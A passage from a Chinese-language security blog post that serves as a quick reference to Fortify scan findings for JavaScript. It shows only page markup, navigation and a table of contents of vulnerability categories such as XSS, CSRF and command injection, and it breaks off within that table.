<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta name="renderer" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <link rel="dns-prefetch" href="http://dayun.shystartree.online">
  <title>fortify扫描结果速查(JavaScript) | qingyu&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="fortify扫描结果速查(JavaScript)，篇幅十分大，推荐使用ctrl+F查找~~~">
<meta name="keywords" content="安全,fortify,速查">
<meta property="og:type" content="article">
<meta property="og:title" content="fortify扫描结果速查(JavaScript)">
<meta property="og:url" content="http://dayun.shystartree.online/2020/04/20/fortify扫描结果速查(JavaScript)/index.html">
<meta property="og:site_name" content="qingyu&#39;s blog">
<meta property="og:description" content="fortify扫描结果速查(JavaScript)，篇幅十分大，推荐使用ctrl+F查找~~~">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201226182427732.jpg">
<meta property="og:updated_time" content="2020-12-29T10:10:51.992Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="fortify扫描结果速查(JavaScript)">
<meta name="twitter:description" content="fortify扫描结果速查(JavaScript)，篇幅十分大，推荐使用ctrl+F查找~~~">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201226182427732.jpg">
  
    <link rel="alternative" href="/atom.xml" title="qingyu&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" type="text/css" href="/./main.0cf68a.css">
  <style type="text/css">
  
    #container.show {
      background: linear-gradient(200deg,#a0cfe4,#e8c37e);
    }
  </style>
  

  

</head>

<body>
  <div id="container" q-class="show:isCtnShow">
    <canvas id="anm-canvas" class="anm-canvas"></canvas>
    <div class="left-col" q-class="show:isShow">
      
<div class="overlay" style="background: #B0E0E6"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			<img src="/img/avatar.jpg" class="js-avatar">
		</a>
		<hgroup>
		  <h1 class="header-author"><a href="/">QingYu</a></h1>
		</hgroup>
		
		<p class="header-subtitle">越努力越幸运</p>
		

		<nav class="header-menu">
			<ul>
			
				<li><a href="/">博客主页</a></li>
	        
				<li><a href="/tags/安全/">信息安全</a></li>
	        
				<li><a href="/tags/速查/">安全速查</a></li>
	        
				<li><a href="/tags/随记/">灵感随记</a></li>
	        
			</ul>
		</nav>
		<nav class="header-smart-menu">
    		
    			
    			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">文章搜搜</a>
    			
            
    			
    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友情链接</a>
    			
            
    			
    			<a q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">About me</a>
    			
            
		</nav>
		<nav class="header-nav">
			<div class="social">
				
					<a class="github" target="_blank" href="https://github.com/shystartree/" title="github"><i class="icon-github"></i></a>
		        
					<a class="weibo" target="_blank" href="https://weibo.com/qingyu520" title="weibo"><i class="icon-weibo"></i></a>
		        
					<a class="rss" target="_blank" href="http://blog.shystartree.online/atom.xml" title="rss"><i class="icon-rss"></i></a>
		        
			</div>
		</nav>
	</header>		
</div>

    </div>
    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
      
<nav id="mobile-nav">
  	<div class="overlay js-overlay" style="background: #B0E0E6"></div>
	<div class="btnctn js-mobile-btnctn">
  		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img src="/img/avatar.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author js-header-author">QingYu</h1>
			</hgroup>
			
			<p class="header-subtitle"><i class="icon icon-quo-left"></i>越努力越幸运<i class="icon icon-quo-right"></i></p>
			
			
			
				
			
				
			
				
			
				
			
			
			
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/shystartree/" title="github"><i class="icon-github"></i></a>
			        
						<a class="weibo" target="_blank" href="https://weibo.com/qingyu520" title="weibo"><i class="icon-weibo"></i></a>
			        
						<a class="rss" target="_blank" href="http://blog.shystartree.online/atom.xml" title="rss"><i class="icon-rss"></i></a>
			        
				</div>
			</nav>

			<nav class="header-menu js-header-menu">
				<ul style="width: 70%">
				
				
					<li style="width: 25%"><a href="/">博客主页</a></li>
		        
					<li style="width: 25%"><a href="/tags/安全/">信息安全</a></li>
		        
					<li style="width: 25%"><a href="/tags/速查/">安全速查</a></li>
		        
					<li style="width: 25%"><a href="/tags/随记/">灵感随记</a></li>
		        
				</ul>
			</nav>
		</header>				
	</div>
	<div class="mobile-mask" style="display:none" q-show="isShow"></div>
</nav>

      <div id="wrapper" class="body-wrap">
        <div class="menu-l">
          <div class="canvas-wrap">
            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
          </div>
          <div id="js-content" class="content-ll">
            <article id="post-fortify扫描结果速查(JavaScript)" class="article article-type-post " itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      fortify扫描结果速查(JavaScript)
    </h1>
  



        
        
        <!-- 不蒜子统计 -->
        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
        </span>

<a href="/2020/04/20/fortify扫描结果速查(JavaScript)/" class="archive-article-date">
  	<time datetime="2020-04-20T10:09:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-20</time>
</a>
        
      </header>
    
    <!-- 目录内容 -->

    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
          <span class="btn-bg"></span>
          <span class="btn-text">文章导航</span>
          </p>
  <div id="toc-article" class="toc-article">
      <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
    <strong class="toc-title">文章目录</strong>
           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaScript"><span class="toc-number">1.</span> <span class="toc-text">JavaScript</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#API误用"><span class="toc-number">1.1.</span> <span class="toc-text">API误用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Negative-Content-Length"><span class="toc-number">1.1.1.</span> <span class="toc-text">Code Correctness: Negative Content-Length</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Mixing-Template-Languages"><span class="toc-number">1.1.2.</span> <span class="toc-text">Often Misused: Mixing Template Languages</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-1"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-1"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-1"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-1"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#封装"><span class="toc-number">1.2.</span> <span class="toc-text">封装</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Frame-Scripting"><span class="toc-number">1.2.1.</span> <span class="toc-text">Cross-Frame Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-2"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-2"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-2"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-2"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Session-Contamination"><span class="toc-number">1.2.2.</span> <span class="toc-text">Cross-Session Contamination</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-3"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-3"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-3"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-3"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Request-Forgery"><span class="toc-number">1.2.3.</span> <span class="toc-text">Cross-Site Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-4"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-4"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-4"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-4"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Untrusted-HTML-Downloads"><span class="toc-number">1.2.4.</span> <span class="toc-text">Cross-Site Scripting: Untrusted HTML Downloads</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-5"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-5"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-5"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-5"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Easy-to-Guess-Database-Name"><span class="toc-number">1.2.5.</span> <span class="toc-text">HTML5: Easy-to-Guess Database Name</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-6"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-6"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-6"><span class="toc-number">1.2.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-6"><span class="toc-number">1.2.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Message-Posting-Policy"><span class="toc-number">1.2.6.</span> <span class="toc-text">HTML5: Overly Permissive Message Posting Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-7"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-7"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-7"><span class="toc-number">1.2.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-7"><span class="toc-number">1.2.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-Hijacking"><span class="toc-number">1.2.7.</span> <span class="toc-text">JavaScript Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-8"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-8"><span class="toc-number">1.2.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-8"><span class="toc-number">1.2.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-8"><span class="toc-number">1.2.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-Hijacking-Vulnerable-Framework"><span class="toc-number">1.2.8.</span> <span class="toc-text">JavaScript Hijacking: Vulnerable Framework</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-9"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-9"><span class="toc-number">1.2.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-9"><span class="toc-number">1.2.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-9"><span class="toc-number">1.2.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Use-of-a-System-Output-Stream"><span class="toc-number">1.2.9.</span> <span class="toc-text">Poor Logging Practice: Use of a System Output Stream</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-10"><span class="toc-number">1.2.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-10"><span class="toc-number">1.2.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-10"><span class="toc-number">1.2.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-10"><span class="toc-number">1.2.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak"><span class="toc-number">1.2.10.</span> <span class="toc-text">System Information Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-11"><span class="toc-number">1.2.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-11"><span class="toc-number">1.2.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-11"><span class="toc-number">1.2.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-11"><span class="toc-number">1.2.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-External"><span class="toc-number">1.2.11.</span> <span class="toc-text">System Information Leak: External</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-12"><span class="toc-number">1.2.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-12"><span class="toc-number">1.2.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-12"><span class="toc-number">1.2.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-12"><span class="toc-number">1.2.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Internal"><span class="toc-number">1.2.12.</span> <span class="toc-text">System Information Leak: Internal</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-13"><span class="toc-number">1.2.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-13"><span class="toc-number">1.2.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-13"><span class="toc-number">1.2.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-13"><span class="toc-number">1.2.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Trust-Boundary-Violation"><span class="toc-number">1.2.13.</span> <span class="toc-text">Trust Boundary Violation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-14"><span class="toc-number">1.2.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-14"><span class="toc-number">1.2.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-14"><span class="toc-number">1.2.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-14"><span class="toc-number">1.2.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境配置"><span class="toc-number">1.3.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-MIME-Sniffing"><span class="toc-number">1.3.1.</span> <span class="toc-text">HTML5: MIME Sniffing</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-15"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-15"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-15"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-15"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Helmet-Misconfiguration-Insecure-XSS-Filter"><span class="toc-number">1.3.2.</span> <span class="toc-text">Helmet Misconfiguration: Insecure XSS Filter</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-16"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-16"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-16"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-16"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#输入验证与展示问题"><span class="toc-number">1.4.</span> <span class="toc-text">输入验证与展示问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Client-Side-Template-Injection"><span class="toc-number">1.4.1.</span> <span class="toc-text">Client-Side Template Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-17"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-17"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-17"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-17"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Command-Injection"><span class="toc-number">1.4.2.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-18"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-18"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-18"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-18"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-DOM"><span class="toc-number">1.4.3.</span> <span class="toc-text">Cross-Site Scripting: DOM</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-19"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-19"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-19"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-19"><span class="toc-number">1.4.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Persistent"><span class="toc-number">1.4.4.</span> <span class="toc-text">Cross-Site Scripting: Persistent</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-20"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-20"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-20"><span class="toc-number">1.4.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-20"><span class="toc-number">1.4.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Poor-Validation"><span class="toc-number">1.4.5.</span> <span class="toc-text">Cross-Site Scripting: Poor Validation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-21"><span class="toc-number">1.4.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-21"><span class="toc-number">1.4.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-21"><span class="toc-number">1.4.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-21"><span class="toc-number">1.4.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Reflected"><span class="toc-number">1.4.6.</span> <span class="toc-text">Cross-Site Scripting: Reflected</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-22"><span class="toc-number">1.4.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-22"><span class="toc-number">1.4.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-22"><span class="toc-number">1.4.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-22"><span class="toc-number">1.4.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-SOP-Bypass"><span class="toc-number">1.4.7.</span> <span class="toc-text">Cross-Site Scripting: SOP Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-23"><span class="toc-number">1.4.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-23"><span class="toc-number">1.4.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-23"><span class="toc-number">1.4.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-23"><span class="toc-number">1.4.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Self"><span class="toc-number">1.4.8.</span> <span class="toc-text">Cross-Site Scripting: Self</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-24"><span class="toc-number">1.4.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-24"><span class="toc-number">1.4.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-24"><span class="toc-number">1.4.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-24"><span class="toc-number">1.4.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service"><span class="toc-number">1.4.9.</span> <span class="toc-text">Denial of Service</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-25"><span class="toc-number">1.4.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-25"><span class="toc-number">1.4.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-25"><span class="toc-number">1.4.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-25"><span class="toc-number">1.4.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service-Regular-Expression"><span class="toc-number">1.4.10.</span> <span class="toc-text">Denial of Service: Regular Expression</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-26"><span class="toc-number">1.4.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-26"><span class="toc-number">1.4.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-26"><span class="toc-number">1.4.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-26"><span class="toc-number">1.4.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Code-Injection"><span class="toc-number">1.4.11.</span> <span class="toc-text">Dynamic Code Evaluation: Code Injection</span></a><ol 